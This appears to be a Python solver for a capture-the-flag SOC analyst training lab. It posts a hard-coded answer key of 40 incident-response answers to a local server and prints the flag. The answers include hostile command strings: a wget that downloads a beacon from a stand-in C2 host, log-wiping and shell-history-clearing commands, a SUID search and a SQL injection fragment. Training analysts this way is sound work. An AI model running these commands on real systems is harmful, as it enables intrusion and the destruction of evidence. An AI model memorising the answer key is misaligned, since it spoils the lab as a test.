"""
Stadium FC — SOC Analyst Lab solver.
Posts all 40 correct answers and recovers the flag.

    python3 solve.py                # localhost:8017
    python3 solve.py http://host:PORT
"""
import re
import sys
import requests


ANSWERS = {
    "q1":  "185.196.8.23",
    "q2":  "91.215.85.142",
    "q3":  "ops_manager",
    "q4":  "10.10.10.10",
    "q5":  "22",
    "q6":  "cmd.php",
    "q7":  "Mozilla/5.0 (X11; Linux) StadiumBot/1.0",
    "q8":  "c2.stadium-ops.example",
    "q9":  "194.26.135.89",
    "q10": "4444",
    "q11": "/var/www/html/uploads/cmd.php",
    "q12": "10.10.10.50",
    "q13": "paste.darkleaf.cc",
    "q14": "2026-03-15",
    "q15": "OR 1=1",
    "q16": "22",
    "q17": "03:47:24",
    "q18": "ET WEB_SERVER SQL Injection Attempt -- UNION SELECT",
    "q19": "2001219",
    "q20": "/etc/cron.d/.sysupdate",
    "q21": "/etc/systemd/system/stadium-telemetry.service",
    "q22": "T1110.001",
    "q23": "T1053.003",
    "q24": "10.10.10.10",
    "q25": "/usr/bin/find / -perm -u=s",
    "q26": "/tmp/.stage/matchdata.tar.gz.enc",
    "q27": "A Network Trojan was detected",
    "q28": ".git/config",
    "q29": "ET POLICY curl User-Agent to External IP -- Possible Data Exfiltration",
    "q30": "3",
    "q31": "xk3mf9a2.biz, q7hnwp4e.biz, r2djc8v1.biz",
    "q32": "rm -rf /var/log/wtmp",
    "q33": "history -c && history -w",
    "q34": "T1548.003",
    "q35": "T1021.004",
    "q36": "12",
    "q37": "2008284",
    "q38": "wget http://c2.stadium-ops.example:4444/beacon -O /tmp/beacon",
    "q39": "10.10.10.51",
    "q40": "T1048.003",
}


def solve(base: str) -> None:
    print(f"[*] target: {base}")
    r = requests.post(f"{base}/submit", data=ANSWERS, timeout=15)
    r.raise_for_status()

    m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
    if not m:
        pct = re.search(r"(\d+)%", r.text)
        print(f"[-] no flag (score={pct.group(1) if pct else '?'}%)")
        print(r.text[:500])
        sys.exit(1)

    print(f"[+] 40/40 — flag: {m.group(1)}")


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8017"
    solve(base.rstrip("/"))
